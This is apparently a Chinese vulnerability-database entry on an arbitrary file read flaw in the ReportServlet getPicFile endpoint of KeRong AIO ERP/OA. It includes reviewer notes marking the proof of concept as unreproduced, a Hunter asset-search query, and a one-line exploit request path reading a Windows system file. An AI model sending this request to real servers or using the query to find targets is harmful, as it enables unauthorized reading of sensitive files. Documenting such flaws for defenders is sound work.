---
source: "wy876 漏洞文库"
title: "科荣AIO ERP/OA ReportServlet getPicFile任意文件读取"
product: "科荣AIO ERP/OA"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知，/DISKC虚拟路径映射条件未知"
prerequisites: "未声明"
side_effects: "命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/yci7gf7f8ezqhzft"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E7%A7%91%E8%8D%A3AIO/%E7%A7%91%E8%8D%A3AIO%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FReportServlet%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "app.name="
hunter: "app.name=\"科荣 AIO\""
id: "vw-e6f628d756e00cca5bb4da05"
entity_id: "ve-e6f628d756e00cca5bb4da05"
schema_version: "1"
---

# 科荣AIO ERP/OA ReportServlet getPicFile任意文件读取

## 条目说明

- 对象与具体问题：科荣AIO ERP/OA；ReportServlet getPicFile任意文件读取
- 版本、配置及部署条件：版本未知，/DISKC虚拟路径映射条件未知
- 认证与权限前提：未声明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 仅一条URL无响应、代码根因和修复说明
- /DISKC/Windows/Win.ini并非标准系统路径，需解释部署映射不可直接推广

## 操作风险

命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
科荣AIO企业一体化管理解决方案,通过ERP（进销存财务）、OA（办公自动化）、CRM（客户关系管理）、UDP（自定义平台），集电子商务平台、支付平台、ERP平台、微信平台、移动APP等解决了众多企业客户在管理过程中跨部门、多功能、需求多变等通用及个性化的问题。科荣 AIO 管理系统存在任意文件读取漏洞，攻击者可以读取敏感文件。

## 二、影响版本
+ 科荣 AIO 管理系统 

## 三、资产测绘
+ hunter`app.name="科荣 AIO"`
+ 特征


## 四、漏洞复现
```plain
/ReportServlet?operation=getPicFile&fileName=/DISKC/Windows/Win.ini
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/yci7gf7f8ezqhzft>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
